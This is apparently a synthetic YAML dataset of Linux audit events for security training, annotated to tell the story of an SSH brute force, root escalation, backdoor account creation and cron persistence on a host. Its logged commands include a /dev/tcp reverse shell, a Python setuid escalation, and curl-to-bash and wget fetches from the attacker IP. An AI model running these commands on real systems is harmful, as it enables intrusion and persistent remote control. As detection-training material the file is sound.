@@ -1,0 +1,314 @@
+# Linux Audit and Security Events for Training
+# Includes SSH brute force, privilege escalation, file integrity, process anomalies, and cron manipulation
+---
+events:
+  # --- SSH Brute Force Logs ---
+  - timestamp: "2026-02-25T01:00:01Z"
+    source: auth.log
+    host: "web01"
+    event_type: ssh_failed_login
+    fields:
+      service: "sshd"
+      pid: 12543
+      message: "Failed password for root from 203.0.113.50 port 45221 ssh2"
+      src_ip: "203.0.113.50"
+      username: "root"
+      attempt: 1
+
+  - timestamp: "2026-02-25T01:00:02Z"
+    source: auth.log
+    host: "web01"
+    event_type: ssh_failed_login
+    fields:
+      service: "sshd"
+      pid: 12544
+      message: "Failed password for root from 203.0.113.50 port 45222 ssh2"
+      src_ip: "203.0.113.50"
+      username: "root"
+      attempt: 2
+
+  - timestamp: "2026-02-25T01:00:03Z"
+    source: auth.log
+    host: "web01"
+    event_type: ssh_failed_login
+    fields:
+      service: "sshd"
+      pid: 12545
+      message: "Failed password for admin from 203.0.113.50 port 45223 ssh2"
+      src_ip: "203.0.113.50"
+      username: "admin"
+      attempt: 3
+
+  - timestamp: "2026-02-25T01:00:15Z"
+    source: auth.log
+    host: "web01"
+    event_type: ssh_failed_login
+    fields:
+      service: "sshd"
+      pid: 12560
+      message: "Failed password for invalid user deploy from 203.0.113.50 port 45240 ssh2"
+      src_ip: "203.0.113.50"
+      username: "deploy"
+      attempt: 15
+    notes: "15th attempt in 15 seconds - clear brute force pattern"
+
+  - timestamp: "2026-02-25T01:01:30Z"
+    source: auth.log
+    host: "web01"
+    event_type: ssh_successful_login
+    fields:
+      service: "sshd"
+      pid: 12580
+      message: "Accepted password for deploy from 203.0.113.50 port 45300 ssh2"
+      src_ip: "203.0.113.50"
+      username: "deploy"
+    notes: "Successful login after brute force - weak password found"
+
+  # --- Privilege Escalation Attempts ---
+  - timestamp: "2026-02-25T01:05:00Z"
+    source: auth.log
+    host: "web01"
+    event_type: sudo_execution
+    fields:
+      service: "sudo"
+      user: "deploy"
+      tty: "pts/0"
+      pwd: "/home/deploy"
+      command: "/bin/bash"
+      message: "deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash"
+    notes: "User deploy gained root shell via sudo"
+
+  - timestamp: "2026-02-25T01:05:30Z"
+    source: audit.log
+    host: "web01"
+    event_type: audit_execve
+    fields:
+      type: "EXECVE"
+      msg: "audit(1740445530.123:456)"
+      argc: 3
+      a0: "/usr/bin/find"
+      a1: "/"
+      a2: "-perm"
+      a3: "-4000"
+      uid: 1001
+      euid: 0
+    notes: "Searching for SUID binaries - privilege escalation reconnaissance"
+
+  - timestamp: "2026-02-25T01:06:00Z"
+    source: audit.log
+    host: "web01"
+    event_type: audit_execve
+    fields:
+      type: "EXECVE"
+      msg: "audit(1740445560.456:457)"
+      argc: 2
+      a0: "/usr/bin/python3"
+      a1: "-c"
+      a2: "import os; os.setuid(0); os.system('/bin/bash')"
+      uid: 1001
+      euid: 0
+    notes: "Python SUID exploit for privilege escalation to root"
+
+  - timestamp: "2026-02-25T01:07:00Z"
+    source: audit.log
+    host: "web01"
+    event_type: audit_user_modify
+    fields:
+      type: "ADD_USER"
+      msg: "audit(1740445620.789:458)"
+      pid: 13001
+      uid: 0
+      auid: 1001
+      ses: 42
+      op: "adding user"
+      acct: "backdoor"
+      exe: "/usr/sbin/useradd"
+      res: "success"
+    notes: "New user 'backdoor' created by attacker with root privileges"
+
+  - timestamp: "2026-02-25T01:07:05Z"
+    source: audit.log
+    host: "web01"
+    event_type: audit_user_modify
+    fields:
+      type: "USER_MGMT"
+      msg: "audit(1740445625.012:459)"
+      pid: 13002
+      uid: 0
+      op: "adding group member"
+      acct: "backdoor"
+      grp: "sudo"
+      exe: "/usr/sbin/usermod"
+      res: "success"
+    notes: "Backdoor account added to sudo group"
+
+  # --- File Integrity Changes ---
+  - timestamp: "2026-02-25T01:10:00Z"
+    source: audit.log
+    host: "web01"
+    event_type: audit_path
+    fields:
+      type: "PATH"
+      msg: "audit(1740445800.111:460)"
+      name: "/etc/passwd"
+      inode: 262146
+      ouid: 0
+      ogid: 0
+      nametype: "NORMAL"
+      cap_fp: "none"
+    notes: "/etc/passwd modification detected - backdoor account added"
+
+  - timestamp: "2026-02-25T01:10:01Z"
+    source: audit.log
+    host: "web01"
+    event_type: audit_path
+    fields:
+      type: "PATH"
+      msg: "audit(1740445801.222:461)"
+      name: "/etc/shadow"
+      inode: 262147
+      ouid: 0
+      ogid: 42
+      nametype: "NORMAL"
+    notes: "/etc/shadow modified - password hash set for backdoor user"
+
+  - timestamp: "2026-02-25T01:12:00Z"
+    source: audit.log
+    host: "web01"
+    event_type: audit_path
+    fields:
+      type: "PATH"
+      msg: "audit(1740445920.333:462)"
+      name: "/root/.ssh/authorized_keys"
+      inode: 524290
+      ouid: 0
+      ogid: 0
+      nametype: "CREATE"
+    notes: "SSH authorized_keys file created/modified - SSH key persistence"
+
+  - timestamp: "2026-02-25T01:12:05Z"
+    source: audit.log
+    host: "web01"
+    event_type: audit_path
+    fields:
+      type: "PATH"
+      msg: "audit(1740445925.444:463)"
+      name: "/usr/bin/ncat"
+      inode: 786433
+      ouid: 0
+      ogid: 0
+      mode: "0104755"
+      nametype: "CREATE"
+    notes: "ncat installed with SUID bit set - potential backdoor"
+
+  # --- Process Execution Anomalies ---
+  - timestamp: "2026-02-25T01:15:00Z"
+    source: audit.log
+    host: "web01"
+    event_type: audit_execve
+    fields:
+      type: "EXECVE"
+      msg: "audit(1740446100.555:464)"
+      argc: 4
+      a0: "/bin/bash"
+      a1: "-c"
+      a2: "bash -i >& /dev/tcp/203.0.113.50/4444 0>&1"
+      uid: 0
+      euid: 0
+    notes: "Reverse shell to attacker IP - active backdoor connection"
+
+  - timestamp: "2026-02-25T01:15:30Z"
+    source: audit.log
+    host: "web01"
+    event_type: audit_execve
+    fields:
+      type: "EXECVE"
+      msg: "audit(1740446130.666:465)"
+      argc: 3
+      a0: "/usr/bin/wget"
+      a1: "-q"
+      a2: "http://203.0.113.50/tools/linpeas.sh"
+      a3: "-O"
+      a4: "/tmp/linpeas.sh"
+      uid: 0
+    notes: "Known post-exploitation enumeration tool downloaded"
+
+  - timestamp: "2026-02-25T01:16:00Z"
+    source: audit.log
+    host: "web01"
+    event_type: audit_execve
+    fields:
+      type: "EXECVE"
+      msg: "audit(1740446160.777:466)"
+      argc: 2
+      a0: "/bin/bash"
+      a1: "/tmp/linpeas.sh"
+      uid: 0
+    notes: "LinPEAS execution - automated Linux privilege escalation check"
+
+  - timestamp: "2026-02-25T01:20:00Z"
+    source: syslog
+    host: "web01"
+    event_type: process_anomaly
+    fields:
+      process: "apache2"
+      pid: 14001
+      child_process: "/bin/sh"
+      child_pid: 14002
+      message: "apache2 spawned unexpected child process /bin/sh"
+      uid: 33
+    notes: "Web server spawning shell - likely webshell or RCE exploitation"
+
+  # --- Cron Job Manipulation ---
+  - timestamp: "2026-02-25T01:25:00Z"
+    source: syslog
+    host: "web01"
+    event_type: cron_modification
+    fields:
+      service: "crontab"
+      user: "root"
+      message: "(root) REPLACE (root)"
+      pid: 14100
+    notes: "Root crontab replaced - persistence mechanism"
+
+  - timestamp: "2026-02-25T01:25:01Z"
+    source: audit.log
+    host: "web01"
+    event_type: audit_path
+    fields:
+      type: "PATH"
+      name: "/var/spool/cron/crontabs/root"
+      nametype: "NORMAL"
+      ouid: 0
+    notes: "Root crontab file modified"
+
+  - timestamp: "2026-02-25T01:25:05Z"
+    source: syslog
+    host: "web01"
+    event_type: cron_execution
+    fields:
+      service: "CRON"
+      user: "root"
+      pid: 14105
+      message: "(root) CMD (curl -s http://203.0.113.50/beacon.sh | bash)"
+    notes: "Malicious cron job executing remote script every minute"
+
+  - timestamp: "2026-02-25T01:30:00Z"
+    source: audit.log
+    host: "web01"
+    event_type: audit_path
+    fields:
+      type: "PATH"
+      name: "/etc/cron.d/system-update"
+      nametype: "CREATE"
+      ouid: 0
+    notes: "New cron.d entry created for persistence"
+
+  - timestamp: "2026-02-25T01:30:01Z"
+    source: syslog
+    host: "web01"
+    event_type: cron_definition
+    fields:
+      file: "/etc/cron.d/system-update"
+      content: "*/5 * * * * root /usr/local/bin/.update-check 2>/dev/null"
+    notes: "Hidden binary executed every 5 minutes by cron - C2 beacon"
